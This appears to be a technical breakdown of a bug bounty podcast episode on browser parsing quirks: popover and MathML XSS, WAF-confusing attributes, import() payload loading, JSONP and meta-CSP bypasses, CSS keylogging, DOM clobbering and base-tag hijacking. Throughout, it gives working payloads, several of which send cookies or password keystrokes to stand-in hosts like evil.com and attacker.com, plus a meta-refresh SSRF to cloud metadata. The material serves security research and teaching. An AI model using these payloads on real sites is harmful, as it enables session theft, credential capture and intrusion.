# Episode 26 — Client-Side Quirks & Browser Hacks — Full Technical Breakdown

## HOSTS
- **Justin Gardner** (@rhynorater) — Bug bounty hunter, co-host
- **Joel Margolis** (teknogeek) — Bug bounty hunter, security engineer, co-host

---

## PART 1 — HTML Popover XSS: New Chrome Feature, Instant Abuse

### Technique 1 — Popover Target XSS (Any Arbitrary Tag)

- **What it is:** Chrome introduced the `popover` API, and PortSwigger Research immediately found it enables XSS on *any arbitrary HTML tag* — not just standard interactive elements. The `popovertarget` attribute on a button can reference a different element by ID, and toggling the popover fires event handlers on that target element.

- **Why it works:** The popover API adds implicit interactivity to elements that were never meant to be interactive. When a button with `popovertarget="X"` is clicked, the browser dispatches toggle events on the element with `id="X"`. That target element can be hidden or even disabled (as Cure53 confirmed), and event handlers on it still fire.

- **Code example — Basic popover XSS (1-click):**
```html
<!-- Attacker-controlled injection -->
<button popovertarget="xss">Click me</button>
<xss id="xss" popover onbeforetoggle=alert(document.domain)>XSS</xss>
```

- **Code example — Targeting a hidden/disabled element:**
```html
<button popovertarget="hidden-target">Innocent Button</button>
<div id="hidden-target" popover hidden onbeforetoggle=alert(document.cookie)></div>
```

- **Code example — Leveraging hidden form inputs for injection:**
```html
<!-- Scenario: reflected query param into hidden input field -->
<!-- URL: https://target.com/page?token="><button popovertarget="x">Click</button><xss id="x" popover onbeforetoggle=alert(1)> -->
<form>
  <input type="hidden" name="token" value=""><button popovertarget="x">Click</button><xss id="x" popover onbeforetoggle=alert(1)>">
</form>
```

- **Attack flow:**
```
Attacker crafts URL with popover payload
           |
           v
User visits page --> Button rendered (visible, styled to blend in)
           |
           v
User clicks button --> popovertarget triggers toggle on target element
           |
           v
onbeforetoggle fires --> Arbitrary JS execution (XSS)
```

- **Where to apply:**
  - WAF bypass scenarios — WAFs may not yet filter `popovertarget` or `onbeforetoggle`
  - When you need XSS on a non-standard/custom tag that normally has no event handlers
  - When the target element is hidden or disabled (classic XSS vectors fail here)
  - Hidden form input reflections where you can inject adjacent HTML

- **Limitations:**
  - Requires at least 1 click (2 clicks in some setups) — not zero-interaction
  - Chrome-only at time of recording (other browsers may adopt later)
  - Impact may be downgraded by programs that distinguish 0-click vs N-click XSS

---

### Technique 2 — Double-Equals Attribute Confusion for WAF/Filter Bypass

- **What it is:** A technique discovered by Sroosh (Erstelle) where using `==` (double equals) instead of `=` in an HTML attribute tricks parsers and WAFs into misinterpreting where the attribute value begins. The browser treats the second `=` and subsequent content as the attribute value, while regex-based filters see an HTML comment or malformed attribute.

- **Why it works:** HTML attribute parsing is lenient. When the browser encounters `attribute==value`, it treats the first `=` as the assignment operator and everything after (including the second `=`) as the unquoted attribute value. WAFs/regex-based sanitizers typically expect `attribute="value"` or `attribute=value`, so `==` with a `"` after it confuses their state machines into thinking the `"` begins a quoted attribute when it is actually content.

- **Code example — Popover target with double-equals to confuse parsers:**
```html
<!-- The popovertarget attribute uses == to create confusion -->
<button popovertarget=="<!--xss">Click</button>
<input id=="<!--xss" popover onbeforetoggle=alert(1)>

<!-- What the WAF sees: an HTML comment starting at <!-- -->
<!-- What the browser sees: popovertarget value is "=<!--xss" -->
```

- **Code example — WAF bypass with attribute value confusion:**
```html
<!-- WAF regex expects: attribute="value" -->
<!-- This breaks the regex state machine: -->
<img src==x"onerror=alert(1)//">

<!-- The browser interprets src value as: =x"onerror=alert(1)// -->
<!-- But some WAFs see the " as starting a new attribute context -->
```

- **Code example — ID with comment-like content (from the episode):**
```html
<button popovertarget=="<!--payload">Click</button>
<input id=="<!--payload" popover onbeforetoggle=alert(document.domain)>

<!-- The ID "=<!--payload" looks like an HTML comment to a naive parser -->
<!-- But the browser correctly resolves the popovertarget reference -->
```

- **Attack flow:**
```
Injection point allows HTML but WAF blocks known XSS patterns
           |
           v
Use == in attribute to confuse WAF regex
(WAF thinks it's a comment or malformed attribute)
           |
           v
Browser correctly parses == as attribute value
           |
           v
Combined with popover or other techniques --> XSS fires
```

- **Where to apply:**
  - Bypassing regex-based WAFs (Cloudflare, Akamai, ModSecurity custom rules)
  - Bypassing third-party HTML sanitizer libraries that don't match browser parsing
  - Any scenario where the parser/sanitizer and the browser disagree on attribute boundaries

- **Limitations:**
  - Requires testing against the specific WAF/sanitizer to confirm mismatch
  - Browsers may eventually normalize this behavior
  - DOMPurify already handles this correctly

---

## PART 2 — Firefox Math Element: Making Any Tag Clickable

### Technique 3 — `<math>` Element Makes Custom Tags Clickable in Firefox

- **What it is:** Inside a `<math>` element in Firefox, any arbitrary tag with an `href` attribute becomes clickable — even non-standard, made-up tags. This enables `javascript:` URI execution via click on elements that would normally be inert.

- **Why it works:** The `<math>` (MathML) namespace in Firefox allows `href` attributes on any child element, inheriting link-like behavior. This is a MathML spec feature that Firefox implements but Chrome does not. Within MathML context, the browser treats `href` as a valid navigation attribute on any element.

- **Code example — XSS via math element with custom tag:**
```html
<math>
  <xss href="javascript:alert(document.domain)">Click here</xss>
</math>
```

- **Code example — Using a completely fabricated tag:**
```html
<math>
  <mtext>
    <anytag href="javascript:alert(document.cookie)">Legitimate looking text</anytag>
  </mtext>
</math>
```

- **Code example — WAF evasion (no standard event handler attributes):**
```html
<!-- No onerror, onclick, onload, etc. — just href inside math -->
<math>
  <mi href="javascript:fetch('https://attacker.com/steal?c='+document.cookie)">
    Click to continue
  </mi>
</math>
```

- **Where to apply:**
  - Firefox-specific XSS when standard event handlers are filtered
  - WAF bypass — `<math>` children with `href` are rarely in WAF rulesets
  - When you need a clickable element but standard tags (a, button, etc.) are blocked

- **Limitations:**
  - **Firefox only** (~2.5% browser market share — under Edge at ~5%)
  - Requires 1 click (not zero-interaction)
  - Many programs may downgrade severity for Firefox-only bugs
  - Browser market share: Chrome ~60%, Safari ~20-25%, Edge ~5%, Firefox ~2.5%

---

## PART 3 — Numeric/Question-Mark Tags and HTML Comment Smuggling

### Technique 4 — Numeric Close Tags Converted to Comments (Chromium Quirk)

- **What it is:** In Chromium, when you use a closing tag with a number (e.g., `</1>`), the browser converts it into an HTML comment rather than treating it as a normal tag. Opening tags with numbers get HTML-encoded. This asymmetric behavior between open and close numeric tags can be abused for parser confusion.

- **Why it works:** The Chromium HTML parser has specific handling in its tokenizer for tags that start with numbers. A closing tag beginning with a digit is not valid HTML, so instead of discarding it, the parser converts it into a comment node. This is a legacy parsing behavior rooted in the HTML spec's error recovery rules.

- **Code example — Numeric close tag becomes comment:**
```html
<!-- What you inject: -->
</1>This text is now inside an HTML comment...-->

<!-- What the browser renders in the DOM: -->
<!--1>This text is now inside an HTML comment...-->
```

- **Code example — Using this to hide content from sanitizers:**
```html
<!-- Sanitizer sees a malformed close tag and may pass it through -->
<!-- Browser converts it to a comment, hiding everything after it -->
</1><img src=x onerror=alert(1)>-->
<p>Visible content here</p>

<!-- In the DOM, the img tag is inside a comment — NOT exploitable alone -->
<!-- But can be combined with other techniques to manipulate parser state -->
```

- **Where to apply:**
  - Parser differential attacks (sanitizer sees one thing, browser sees another)
  - WAF bypass when you need to smuggle content past a filter
  - Chaining with other techniques to manipulate how subsequent content is parsed

- **Limitations:**
  - Not directly exploitable on its own
  - DOMPurify handles this correctly
  - Primarily useful as a building block in parser confusion chains

---

### Technique 5 — Question Mark Tag Creates HTML Comment (`<?` prefix)

- **What it is:** In Chromium, `<?anything>` (less-than followed by question mark) gets converted into an HTML comment. This is documented in the Chromium source code and comes from legacy processing instruction handling.

- **Why it works:** The HTML spec defines `<?` as the start of a "bogus comment." The Chromium tokenizer enters a comment state when it encounters `<?`, consuming everything until `>` as comment content. This is distinct from XML processing instructions — in HTML mode it's purely treated as a comment.

- **Code example — Question mark tag to comment:**
```html
<!-- Injected payload: -->
<?This becomes a comment>

<!-- DOM result: -->
<!--?This becomes a comment-->
```

- **Code example — Comment smuggling without `!` character:**
```html
<!-- Scenario: WAF blocks <!-- but allows <? -->
<!-- You need to comment out a section of HTML -->

<?><script>alert(1)</script>-->
<!-- The <? opens a comment, consuming content until > -->
<!-- But then the script tag after > is NOT in the comment -->

<!-- More useful: commenting out a closing tag -->
<div id="inject">
  Your injection here
  <?/div>
  <!-- The </div> you need to "eat" is now inside a comment -->
  <!-- Subsequent content escapes the original div context -->
</div>
```

- **Attack flow:**
```
Injection point where ! is filtered/blocked but ? is allowed
           |
           v
Use <? to open a bogus comment (equivalent to <!-- in browser)
           |
           v
Comment out problematic syntax (closing tags, sanitizer markers)
           |
           v
Remaining content parsed in unexpected context --> chain to XSS
```

- **Where to apply:**
  - When `!` is blocked/filtered but `?` is not (e.g., URL-based filters)
  - Parser confusion chains to comment out inconvenient HTML
  - Bypassing WAFs that only look for `<!--` as comment syntax

- **Limitations:**
  - The comment ends at the next `>` character, which limits how much you can consume
  - Not directly exploitable alone — a chaining technique

---

## PART 4 — Dynamic `import()` for XSS Payload Delivery

### Technique 6 — `import()` as an XSS Payload Shortener

- **What it is:** The dynamic `import()` expression (ECMAScript module import) works in the browser, not just Node.js. It allows importing a remote JavaScript module with minimal characters, making it invaluable for length-restricted XSS payloads. Learned from **file descriptor** at a live hacking event.

- **Why it works:** `import()` is a browser-native ECMAScript feature that returns a Promise and fetches a JavaScript module from a URL. Unlike `<script src="">`, which only works during initial DOM parsing, `import()` works at any time — inside event handlers, inline scripts, `eval()`, etc. It fetches and executes a full JS module from a remote URL.

- **Code example — Minimal XSS payload with import():**
```html
<!-- Instead of a long payload, use import() to load external script -->
<img src=x onerror="import('//evil.com/x.js')">

<!-- Compare with traditional approaches: -->
<!-- Long: <img src=x onerror="var s=document.createElement('script');s.src='//evil.com/x.js';document.head.appendChild(s)"> -->
<!-- import() is dramatically shorter -->
```

- **Code example — import() in various XSS contexts:**
```html
<!-- In SVG context -->
<svg onload="import('//evil.com/payload.mjs')">

<!-- In event handler -->
<div onmouseover="import('//evil.com/steal.js')">hover</div>

<!-- In eval/setTimeout -->
<script>eval("import('//evil.com/x.js')")</script>

<!-- In template literal injection -->
<script>
  var x = `${import('//evil.com/x.js')}`;
</script>
```

- **Code example — The remote module (evil.com/x.js):**
```javascript
// x.js — Full exploit payload with no length restrictions
fetch('https://attacker.com/log?cookie=' + document.cookie);
// Or account takeover, or full DOM manipulation, etc.
```

- **Code example — Hijacking `then()` on dynamic import (from MDN warning):**
```javascript
// If an application does: import('./userModule.js').then(m => m.init())
// And you can control the file content (e.g., via path traversal or file upload):

// malicious-module.js
export function then(resolve) {
  // This gets called automatically because import() returns a Promise
  // and the module has a 'then' export, making it a "thenable"
  fetch('https://attacker.com/steal?cookies=' + document.cookie);
  resolve({ init: () => {} }); // satisfy the original .then() chain
}
```

- **Attack flow:**
```
Length-restricted XSS injection point (e.g., 50 char limit)
           |
           v
Use import('//evil.com/x') — only ~25 characters
           |
           v
Browser fetches remote JS module
           |
           v
Full arbitrary JS execution (no length limits on remote file)
```

- **Where to apply:**
  - Length-restricted XSS (URL parameters, attribute values with char limits)
  - Event handler injection where you can't use `<script src>`
  - Post-DOM-load injection (script src tags don't execute after DOM parse)
  - Code golf challenges in CTFs and live hacking events

- **Limitations:**
  - **Respects CSP** — `script-src` directive applies to `import()` fetches
  - Requires the attacker-controlled server to serve valid JS/module content
  - CORS may interfere if the target site has strict cross-origin policies
  - The fetched URL must serve with appropriate MIME type for modules

---

## PART 5 — JavaScript Comment Smuggling (4 Comment Types)

### Technique 7 — HTML Comments Inside JavaScript Blocks

- **What it is:** JavaScript supports HTML-style comments (`<!--` and `-->`) as line comments due to legacy browser compatibility. This means `<!--` acts like `//` inside a `<script>` block. Source: Gareth Hayes' "JavaScript for Hackers" book, page 66.

- **Why it works:** Before JavaScript was universally supported, developers wrapped script contents in HTML comments to hide them from non-JS browsers. Modern engines preserved this behavior for backward compatibility. The `<!--` starts a single-line comment, and `-->` (at the start of a line) also acts as a single-line comment.

- **Code example — HTML comment as JS comment:**
```html
<script>
  <!-- This is a valid JavaScript comment (acts like //)
  var x = 1;
  --> This is also a valid JS comment (at start of line)
  var y = 2; // y is defined, x is defined, comments are ignored
</script>
```

- **Code example — Weaponized: commenting out code after injection:**
```html
<!-- Scenario: injecting into a JS variable -->
<script>
  var userInput = 'INJECTION<!-- ';
  var secret = 'admin_token_here'; // This line is now commented out!
  var other = 'still commented'; // Also commented
</script>
<!-- Everything after <!-- on that line AND subsequent lines with --> prefix is a comment -->
```

- **Where to apply:**
  - Injecting into JavaScript string contexts where `//` is filtered but `<!--` is not
  - Commenting out security checks or sanitization code that follows your injection point
  - WAF/filter bypass when traditional JS comment syntax is blocked

---

### Technique 8 — Hashbang (`#!`) Comment as First Statement

- **What it is:** `#!` (hashbang/shebang) at the very beginning of a JavaScript file or `<script>` block acts as a single-line comment. It MUST be the first statement — anywhere else causes a syntax error.

- **Why it works:** This was added to ECMAScript to support hashbang lines in server-side JS (e.g., `#!/usr/bin/env node`). Browsers adopted it for compatibility. The parser specifically checks if `#!` appears at position 0 of the script and treats the entire first line as a comment.

- **Code example:**
```html
<script>
#! This entire line is a comment — but ONLY because it's the first line
alert('This executes normally');
</script>
```

- **Code example — Weaponized: neutering a CSP nonce script:**
```html
<!-- If you can inject at the very start of a nonce'd script block: -->
<script nonce="abc123">
#! Original legitimate code that was here is now commented out
import('//evil.com/payload.js')
</script>
```

- **Where to apply:**
  - Injection at the very beginning of a script block
  - When `//` and `<!--` are filtered but `#!` is not
  - Edge case but useful in parser confusion chains

- **Limitations:**
  - Only works as the very first line of a script
  - Syntax error if used anywhere else
  - Very narrow applicability

---

### Technique 9 — Closing HTML Comment (`-->`) as JS Line Comment

- **What it is:** The closing HTML comment `-->` (two dashes followed by `>`) works as a single-line comment in JavaScript when it appears at the beginning of a line.

- **Why it works:** Part of the same legacy HTML-comment-in-JS compatibility. The `-->` at the start of a line is treated as a single-line comment by the JavaScript parser.

- **Code example:**
```javascript
var x = 1;
--> This line is a comment
var y = 2; // y = 2 executes fine
```

- **Code example — Closing out an injection context:**
```html
<script>
  var data = 'injected_value';
  --> var sensitiveCheck = validateToken();
  // The validation line above is now a comment
  doAction(data); // Proceeds without validation
</script>
```

- **Where to apply:**
  - When you need a comment that starts mid-script but `//` is blocked
  - Combining with `<!--` for full HTML-comment-in-JS exploitation
  - Note: the en-dash character (option+dash on Mac) may appear in documentation but the actual working syntax requires two ASCII hyphens `-->`

---

## PART 6 — Escaping JavaScript String Context via Script Tag Closure

### Technique 10 — Closing `</script>` to Escape JS String Context

- **What it is:** When injecting into a JavaScript variable (inside `<script>` tags), if quotes and backslashes are properly escaped, you can still break out by injecting `</script>` — the HTML parser takes priority over the JavaScript parser and terminates the script block regardless of JavaScript syntax state.

- **Why it works:** The HTML parser's tokenizer operates at a higher level than the JavaScript parser. When the HTML tokenizer encounters `</script>`, it closes the script block **immediately**, regardless of whether you're inside a JS string, comment, or template literal. There is no requirement for valid JavaScript inside `<script>` tags. An open quote that never closes is perfectly fine — the browser simply ignores the JS syntax error.

- **Code example — Breaking out of a JS string:**
```html
<!-- Server-side template: -->
<script>
  var username = '{{user_input}}';
  doSomething(username);
</script>

<!-- Payload: </script><img src=x onerror=alert(document.domain)> -->
<!-- Result: -->
<script>
  var username = '</script><img src=x onerror=alert(document.domain)>';
  doSomething(username);
</script>

<!-- Browser sees: -->
<!-- Script block: var username = '    (syntax error, ignored) -->
<!-- Then raw HTML: <img src=x onerror=alert(document.domain)>  -->
```

- **Code example — Double-quoted context:**
```html
<script>
  var config = "user_input_here";
</script>

<!-- Payload: </script><svg/onload=alert(1)> -->
<!-- Even though " is escaped, </script> breaks out of the entire block -->
```

- **Attack flow:**
```
Input reflected inside JS string in <script> block
           |
           v
Quotes/backslashes are escaped (can't break JS string)
           |
           v
Inject </script> — HTML parser closes the script block
           |
           v
Everything after is parsed as HTML
           |
           v
Inject event handler (onerror, onload, etc.) --> XSS
```

- **CSP consideration:**
```
If the script tag has a nonce:  <script nonce="abc123">
           |
           v
Closing </script> loses the nonce context
           |
           v
New elements outside the nonce'd script need their own
execution method (inline event handlers, etc.)
           |
           v
CSP script-src with nonce will BLOCK inline handlers
           |
           v
This is a double-edged sword: breaks out of JS but loses nonce
```

- **Where to apply:**
  - Any injection into a JS string/variable inside `<script>` tags
  - When quotes and backslashes are escaped but `<` and `/` are not
  - Server-side template injections into JS context

- **Limitations:**
  - If CSP uses nonces, you lose the nonce by breaking out of the script tag
  - Requires `<` and `/` to not be HTML-encoded in the output
  - Some frameworks auto-encode `</` in JS contexts (e.g., Django, Rails)

---

## PART 7 — CSP Bypass Techniques and JSONP Gadgets

### Technique 11 — JSONP Callback Injection for CSP Bypass

- **What it is:** Many large domains (Google, YouTube, etc.) host JSONP endpoints that allow arbitrary callback function names. If these domains are whitelisted in a target's CSP `script-src`, you can load a JSONP endpoint with a malicious callback to execute arbitrary JavaScript while staying within the CSP policy.

- **Why it works:** JSONP endpoints typically accept a `callback` parameter and wrap their response in that function call. If the callback parameter isn't properly restricted (e.g., allows semicolons, parentheses), you can inject arbitrary JS. Since the domain serving the JSONP is in the CSP allowlist, the browser permits execution.

- **Code example — JSONP CSP bypass:**
```html
<!-- Target CSP: script-src 'self' *.google.com -->

<!-- Abuse a Google JSONP endpoint: -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)//"></script>

<!-- With semicolon injection in callback: -->
<script src="https://subdomain.google.com/api?callback=alert(1);foo"></script>
```

- **Code example — More sophisticated JSONP abuse:**
```javascript
// JSONP response with injected callback:
// GET /api?callback=document.location='https://evil.com/?c='+document.cookie//
// Response:
document.location='https://evil.com/?c='+document.cookie//({data: "response"})
```

- **Tool: Google CSP Evaluator:**
```
https://csp-evaluator.withgoogle.com/

Paste a full CSP header --> identifies known bypass domains/paths
Has a database of known JSONP gadgets on popular domains
```

- **Where to apply:**
  - Any target with CSP that whitelists large third-party domains
  - YouTube, Google, Facebook CDNs, and other major platforms often have JSONP endpoints
  - Check CSP Evaluator first, then manually hunt for additional JSONP endpoints

- **Limitations:**
  - CSP Evaluator is based on 2016 research — many newer bypasses not included
  - Some JSONP endpoints have been patched to restrict callback characters
  - `strict-dynamic` CSP directive can mitigate JSONP-based bypasses

---

### Technique 12 — Meta Tag CSP Injection to Block Sanitizer Libraries

- **What it is:** If you have HTML injection, you can inject a `<meta http-equiv="Content-Security-Policy">` tag to add a **more restrictive** CSP that blocks the loading of security libraries (like DOMPurify), leaving subsequent content unsanitized.

- **Why it works:** The `<meta>` CSP tag is additive — it can only make the policy **stricter**, not more permissive. If the application loads a sanitizer library (like DOMPurify) from a CDN, you can inject a CSP that blocks that CDN, preventing the sanitizer from loading. Subsequent user input is then unsanitized.

- **Code example — Blocking DOMPurify with meta CSP:**
```html
<!-- Inject before the DOMPurify script loads: -->
<meta http-equiv="Content-Security-Policy" content="script-src 'none'">

<!-- Now DOMPurify (or any other script) cannot load -->
<!-- If there's a second injection point processed WITHOUT DOMPurify: XSS -->
```

- **Code example — Surgical blocking of specific CDN:**
```html
<!-- Target loads DOMPurify from cdnjs -->
<!-- Original: <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/..."> -->

<!-- Inject a CSP that blocks cdnjs but allows inline scripts: -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline'">

<!-- cdnjs is now blocked, DOMPurify doesn't load -->
<!-- But inline scripts still work -->
```

- **Attack flow:**
```
HTML injection point ABOVE where sanitizer library is loaded
           |
           v
Inject <meta http-equiv="Content-Security-Policy" content="script-src 'none'">
           |
           v
Sanitizer library (DOMPurify, etc.) fails to load
           |
           v
Second injection point (or user input) is now unsanitized
           |
           v
XSS via the second, now-unprotected vector
```

- **Where to apply:**
  - HTML injection that appears in the DOM before sanitizer script tags
  - Applications that rely on client-side sanitization libraries
  - Can also be used to block analytics/tracking scripts as a side effect

- **Limitations:**
  - Meta CSP can only make policy stricter, not bypass existing headers
  - Must appear in the DOM BEFORE the script you want to block
  - Server-sent CSP headers still apply in addition to the meta tag

---

## PART 8 — Meta Tag Redirect (Zero-Click Open Redirect / SSRF)

### Technique 13 — Meta Refresh for Zero-Interaction Redirect

- **What it is:** The `<meta http-equiv="refresh">` tag causes the browser to navigate to a new URL after a specified delay — with **zero user interaction**. This is one of the only ways to achieve a redirect from pure HTML without JavaScript.

- **Why it works:** The `refresh` HTTP-equiv value instructs the browser to reload or navigate after a timeout. This is a fundamental HTML feature that predates JavaScript and is supported in all browsers. It works even when JavaScript is disabled or blocked by CSP.

- **Code example — Immediate redirect (open redirect):**
```html
<meta http-equiv="refresh" content="0;url=https://evil.com/phishing">
```

- **Code example — Redirect with delay (looks more legitimate):**
```html
<meta http-equiv="refresh" content="3;url=https://evil.com/login">
<!-- User sees original page for 3 seconds, then gets redirected -->
```

- **Code example — Token/cookie stealing via redirect:**
```html
<!-- If the page has tokens in the URL or DOM: -->
<meta http-equiv="refresh" content="0;url=https://attacker.com/steal?referrer=">
<!-- The Referer header will contain the original URL with tokens -->
```

- **Code example — SSRF via meta refresh in headless browsers:**
```html
<!-- If a headless browser (Puppeteer, Playwright) renders your HTML: -->
<meta http-equiv="refresh" content="0;url=http://169.254.169.254/latest/meta-data/">
<!-- Headless browser follows the redirect to internal metadata endpoint -->
```

- **Where to apply:**
  - HTML injection where JavaScript is blocked (CSP `script-src 'none'`)
  - HTML email injection (email clients that render meta refresh)
  - Headless browser / PDF generation SSRF
  - Embedded device web interfaces
  - Bypassing JS-based redirect protections

- **Limitations:**
  - `data:` URI redirects are blocked in modern Safari (tested on 16.5.1)
  - `javascript:` URIs in meta refresh don't execute in modern browsers
  - Some contexts strip meta tags (e.g., certain CMSes, email clients)

---

## PART 9 — Meta Tag Content-Type / Encoding Manipulation

### Technique 14 — Changing Page Encoding via Meta Tag

- **What it is:** The `<meta http-equiv="Content-Type">` tag can change the character encoding of the page. If you can inject this early enough in the DOM, you can force the browser to re-interpret subsequent bytes using a different encoding, potentially turning benign byte sequences into XSS payloads.

- **Why it works:** When the browser encounters a meta charset declaration, it may restart parsing with the new encoding. Different encodings interpret the same byte sequences as different characters. Classic example: UTF-7 encoding can represent `<` and `>` as `+ADw-` and `+AD4-`, bypassing HTML entity encoding.

- **Code example — UTF-7 encoding attack (legacy):**
```html
<!-- Inject encoding change: -->
<meta http-equiv="Content-Type" content="text/html; charset=UTF-7">

<!-- Later in the page, inject UTF-7 encoded XSS: -->
+ADw-script+AD4-alert(document.domain)+ADw-/script+AD4-

<!-- Browser decodes UTF-7: <script>alert(document.domain)</script> -->
```

- **Code example — ISO-2022-JP encoding quirk:**
```html
<meta http-equiv="Content-Type" content="text/html; charset=ISO-2022-JP">
<!-- Certain byte sequences in this encoding can be misinterpreted -->
```

- **Where to apply:**
  - When HTML entities are properly escaped but raw bytes are preserved
  - Legacy systems that don't set charset in HTTP headers (meta tag takes precedence)
  - PDF generators or HTML-to-image converters that respect meta charset

- **Limitations:**
  - Modern browsers largely ignore charset changes after parsing has begun
  - UTF-7 is no longer supported in modern Chrome/Firefox
  - HTTP header `Content-Type: charset=utf-8` overrides meta tag
  - Very limited modern applicability — mostly historical context

---

## PART 10 — CSS Keylogger via Style Injection

### Technique 15 — CSS-Based Keystroke Exfiltration

- **What it is:** With CSS injection (e.g., via meta `default-style` or direct `<style>` injection), you can detect individual keystrokes in input fields by using CSS attribute selectors that trigger background URL loads for each matching input value.

- **Why it works:** CSS `input[value^="a"]` selectors match when the value attribute starts with "a". Combined with `background: url(...)`, each keystroke that changes the value attribute triggers a request to an attacker-controlled server. React apps that sync `value` attribute with state are especially vulnerable.

- **Code example — CSS keylogger:**
```css
/* Exfiltrate first character of password field */
input[type="password"][value^="a"] { background: url(https://attacker.com/log?key=a); }
input[type="password"][value^="b"] { background: url(https://attacker.com/log?key=b); }
input[type="password"][value^="c"] { background: url(https://attacker.com/log?key=c); }
/* ... for every character */

/* Exfiltrate second character */
input[type="password"][value^="aa"] { background: url(https://attacker.com/log?key=aa); }
input[type="password"][value^="ab"] { background: url(https://attacker.com/log?key=ab); }
/* ... exponential combinations */
```

- **Code example — Injection via HTML injection point:**
```html
<style>
input[value^="p"] { background: url(//evil.com/k?v=p); }
input[value^="pa"] { background: url(//evil.com/k?v=pa); }
input[value^="pas"] { background: url(//evil.com/k?v=pas); }
/* Pre-generated for all common password prefixes */
</style>
```

- **Where to apply:**
  - React/Vue/Angular apps where `value` attribute updates reactively
  - HTML injection where `<style>` tags are allowed but `<script>` is blocked
  - CSP blocks script execution but allows style injection (`style-src 'unsafe-inline'`)
  - Creating phishing-level impact from "just" an HTML injection

- **Limitations:**
  - Only works when the `value` HTML attribute is synced with user input (React does this)
  - Native HTML inputs don't update the `value` attribute on keystroke by default
  - CSP `style-src` can block injected styles
  - Requires a very large CSS payload (exponential growth per character position)

---

## PART 11 — DOM Clobbering: Variable Hijacking via HTML Injection

### Technique 16 — DOM Clobbering with Named Element Collections

- **What it is:** DOM clobbering exploits the browser behavior where HTML elements with `id` attributes become accessible as properties on the `window` object. By injecting HTML elements with specific IDs, you can override JavaScript variables and hijack application logic. Advanced technique: using **DOM collections** (multiple elements with the same ID) + the `name` attribute to control sub-properties.

- **Why it works:** Browsers auto-register elements with `id` on the `window` object (e.g., `<div id="foo">` makes `window.foo` reference that element). When two elements share the same `id`, they form an `HTMLCollection`. Within that collection, the `name` attribute is used to access individual elements. When an `<a>` tag's `.toString()` is called (implicit string coercion), it returns its `href` value. Chaining these behaviors = full variable + sub-property control.

- **Code example — Basic DOM clobbering:**
```html
<!-- Application code expects: -->
<script>
  if (window.config) {
    loadScript(config.src);
  }
</script>

<!-- Attacker injects: -->
<a id="config" href="https://evil.com/malicious.js"></a>

<!-- window.config now points to the <a> element -->
<!-- config.toString() returns "https://evil.com/malicious.js" -->
<!-- But config.src would be undefined — need sub-property access -->
```

- **Code example — Advanced: DOM collection for sub-property access (from PortSwigger Academy):**
```html
<!-- Application code: -->
<script>
  var url = window.someObject.url;
  var s = document.createElement('script');
  s.src = url;
  document.body.appendChild(s);
</script>

<!-- Attacker injects ABOVE the script: -->
<a id="someObject"></a>
<a id="someObject" name="url" href="https://evil.com/xss.js"></a>

<!-- How it works: -->
<!-- 1. Two elements with id="someObject" create an HTMLCollection -->
<!-- 2. window.someObject returns the HTMLCollection -->
<!-- 3. someObject.url resolves via the name="url" on the second <a> -->
<!-- 4. The second <a> is returned -->
<!-- 5. When used as string (s.src = ...), <a>.toString() returns href -->
<!-- 6. Script loads from https://evil.com/xss.js -->
```

- **Attack flow (ASCII diagram):**
```
HTML injection point (above target script)
           |
           v
Inject: <a id="someObject"></a>
        <a id="someObject" name="url" href="//evil.com/xss.js"></a>
           |
           v
Browser creates HTMLCollection for window.someObject
           |
           +---> someObject[0] = first <a> (no name)
           +---> someObject[1] = second <a> (name="url")
           |
           v
JS accesses window.someObject.url
           |
           v
HTMLCollection property lookup: name="url" --> returns second <a>
           |
           v
Implicit toString() on <a> element --> returns href value
           |
           v
"https://evil.com/xss.js" loaded as script --> XSS
```

- **Code example — Clobbering a security check:**
```html
<!-- Application has: -->
<script>
  if (!window.isAuthenticated) {
    window.location = '/login';
  }
  // ... admin functionality
</script>

<!-- Attacker injects: -->
<div id="isAuthenticated"></div>

<!-- window.isAuthenticated is now a truthy HTMLDivElement -->
<!-- Security check bypassed, admin functionality accessible -->
```

- **Where to apply:**
  - Any HTML injection where JavaScript follows and references `window.*` properties
  - Bypassing client-side security checks (`if (window.someFlag)`)
  - Hijacking script URLs loaded from JS-defined variables
  - Sandbox escape scenarios (e.g., iframe sandboxes that check window properties)

- **Limitations:**
  - You can only go **two levels deep** (e.g., `window.x.y` but not `window.x.y.z`)
  - Injection must appear in the DOM BEFORE the script that reads the variable
  - Some frameworks use `const`/`let` in local scope, which can't be clobbered
  - Modern code using `typeof x !== 'undefined'` checks may not be affected

---

## PART 12 — Base Tag Hijacking for Relative URL Takeover

### Technique 17 — `<base>` Tag to Hijack Relative URLs

- **What it is:** The `<base href="...">` tag changes the base URL for all relative URLs on the page. If injected via HTML injection, ALL relative script sources, link hrefs, form actions, image sources, and fetch calls using relative paths will resolve against the attacker's domain. **Confirmed during the episode: base tag works in both `<head>` AND `<body>` in Chrome and Safari.**

- **Why it works:** The browser uses the `<base>` tag to resolve any relative URL on the page. If `<base href="https://evil.com/">` is injected, then `<script src="/app.js">` becomes `<script src="https://evil.com/app.js">`. This applies to every relative URL that appears AFTER the base tag in DOM order.

- **Code example — Hijacking script loads:**
```html
<!-- Attacker injects in the body (confirmed working in Chrome + Safari): -->
<base href="https://evil.com/">

<!-- Subsequent relative script tags load from attacker domain: -->
<script src="/js/app.js"></script>
<!-- Actually loads: https://evil.com/js/app.js -->

<script src="bundle.min.js"></script>
<!-- Actually loads: https://evil.com/bundle.min.js -->
```

- **Code example — Hijacking form action:**
```html
<base href="https://evil.com/">

<!-- Login form now submits credentials to attacker: -->
<form action="/api/login" method="POST">
  <input name="username">
  <input name="password" type="password">
  <button>Login</button>
</form>
<!-- Submits to: https://evil.com/api/login -->
```

- **Code example — Potential CSP bypass via base tag:**
```html
<!-- CSP: script-src 'self' -->
<!-- 'self' resolves to the base URL! -->

<base href="https://evil.com/">
<!-- Now 'self' in CSP might resolve to evil.com for relative URLs -->
<!-- (Depends on browser implementation — test carefully) -->

<script src="/payload.js"></script>
<!-- Browser may allow this because the resolved URL is "self" relative to base -->
```

- **Attack flow:**
```
HTML injection anywhere on the page (head OR body)
           |
           v
Inject: <base href="https://evil.com/">
           |
           v
All relative URLs after this point resolve to evil.com
           |
           v
Scripts: /js/app.js --> https://evil.com/js/app.js (XSS)
Forms: /login --> https://evil.com/login (credential theft)
Links: /dashboard --> https://evil.com/dashboard (phishing)
Images: /logo.png --> https://evil.com/logo.png (defacement)
```

- **Where to apply:**
  - HTML injection (even without JS execution capability)
  - Pages that use relative URLs for script loading
